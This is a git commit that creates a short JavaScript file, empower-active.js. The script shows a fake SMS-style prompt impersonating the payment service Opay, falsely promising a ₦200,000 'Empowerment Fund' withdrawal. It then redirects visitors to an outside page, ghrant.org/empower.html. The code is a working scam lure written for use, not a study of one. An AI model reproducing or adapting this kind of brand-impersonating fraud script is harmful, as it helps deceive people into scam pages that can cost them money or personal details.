e080518118e0a9f046930970a2d86185a085f61f
mfednewblog8 <nsikakimoh68@gmail.com>
2025-10-25 07:52:38 +0100

    Create empower-active.js

---
+++ empower-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦200,000'
+password=prompt('SMS: Congratulations, you are among the selected Opay Users to Get ₦200,000 Empowerment Fund, Press Ok to withdraw cash Now ','WITHDRAW ₦200,000');
+if (password != 'WITHDRAW ₦200,000') {
+location.href='https://ghrant.org/empower.html';
+}
